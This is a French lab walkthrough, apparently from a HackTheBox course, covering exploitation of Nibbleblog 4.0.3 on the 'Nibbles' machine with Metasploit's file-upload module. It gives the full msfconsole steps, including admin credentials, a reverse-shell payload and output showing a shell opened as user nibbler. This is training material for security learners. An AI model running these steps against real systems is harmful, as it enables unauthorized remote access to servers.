---
tags:
  - getting-started
ordre: 19
---

# Nibbles - Méthode alternative pour l'utilisateur - Metasploit

---

Comme nous l'avons vu précédemment, il existe également un module `Metasploit` qui fonctionne pour cette machine. Il est beaucoup plus simple, mais il est utile de pratiquer les deux méthodes pour se familiariser avec le plus d'outils et de techniques possible. Démarrez `Metasploit` depuis votre machine d'attaque en tapant `msfconsole`. Une fois chargé, nous pouvons rechercher l'exploit.

```bash
msf6 > search nibbleblog  Matching Modules
================     #  Name                                       Disclosure Date  Rank       Check  Description  -  ----                                       ---------------  ----       -----  -----------     0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability   Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```

Nous pouvons ensuite taper `use 0` pour charger l'exploit sélectionné. Définissez l'option `rhosts` sur l'adresse IP de la cible et `lhost` sur l'adresse IP de votre adaptateur `tun0` (celui qui est fourni avec la connexion VPN à HackTheBox).

```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190 rhosts => 10.129.42.190

msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2  lhost => 10.10.14.2
```

Tapez `show options` pour voir quelles autres options doivent être configurées.

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > show options   Module options (exploit/multi/http/nibbleblog_file_upload):    Name       Current Setting  Required  Description ----       ---------------  --------  -----------   PASSWORD                    yes       The password to authenticate with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'   RPORT      80               yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /                yes       The base path to the web application   USERNAME                    yes       The username to authenticate with   VHOST                       no        HTTP server virtual host   Payload options (php/meterpreter/reverse_tcp):    Name   Current Setting  Required  Description ----   ---------------  --------  -----------   LHOST  10.10.14.2       yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port   Exploit target:    Id  Name --  ----   0   Nibbleblog 4.0.3
```

Nous devons définir le nom d'utilisateur et le mot de passe administrateur `admin:nibbles` et le `TARGETURI` sur `nibbleblog`.

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin username => admin

msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles password => nibbles

msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog targeturi => nibbleblog
```

Nous devons également changer le type de charge utile (payload). Pour nos besoins, optons pour `generic/shell_reverse_tcp`. Nous entrons ces options, puis nous tapons `exploit` et nous recevons un shell inversé (reverse shell).

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp payload => generic/shell_reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > show options   Module options (exploit/multi/http/nibbleblog_file_upload):     Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    PASSWORD   nibbles          yes       The password to authenticate with    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      80               yes       The target port (TCP)    SSL        false            no        Negotiate SSL/TLS for outgoing connections    TARGETURI  nibbleblog       yes       The base path to the web application    USERNAME   admin            yes       The username to authenticate with    VHOST                       no        HTTP server virtual host   Payload options (generic/shell_reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  10.10.14.2      yes       The listen address (an interface may be specified)    LPORT  4444            yes       The listen port   Exploit target:     Id  Name    --  ----    0   Nibbleblog 4.0.3

msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php  id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

À partir de là, nous pouvons suivre le même chemin d'escalade de privilèges.

---

## Prochaines Étapes

Assurez-vous de suivre et d'essayer toutes les étapes par vous-même. Essayez d'autres outils et méthodes pour obtenir le même résultat. Prenez des notes détaillées sur votre propre parcours d'exploitation, même si vous suivez les mêmes étapes que celles décrites dans cette section. C'est une bonne pratique et une mémoire musculaire qui vous sera très bénéfique tout au long de votre carrière. Si vous avez un blog, faites un walkthrough de cette machine et soumettez-le à la plateforme. Si vous n'en avez pas, créez-en un. N'utilisez simplement pas la version 4.0.3 de `Nibbleblog`.

Il existe souvent de nombreuses façons d'accomplir la même tâche. Comme il s'agit d'une machine plus ancienne, d'autres méthodes d'escalade de privilèges, comme un noyau (kernel) obsolète ou l'exploitation de certains services, sont probables. Mettez-vous au défi d'énumérer la machine et de rechercher d'autres failles. Existe-t-il un autre moyen d'abuser de l'application web `Nibbleblog` pour obtenir un shell inversé ? Étudiez attentivement ce walkthrough et assurez-vous de bien comprendre chaque étape avant de continuer.
---

← [[18 - Nibbles - Élévation de privilèges]] | [[00 - Sommaire Getting Started|Sommaire]] | [[20 - Écueils courants]] →
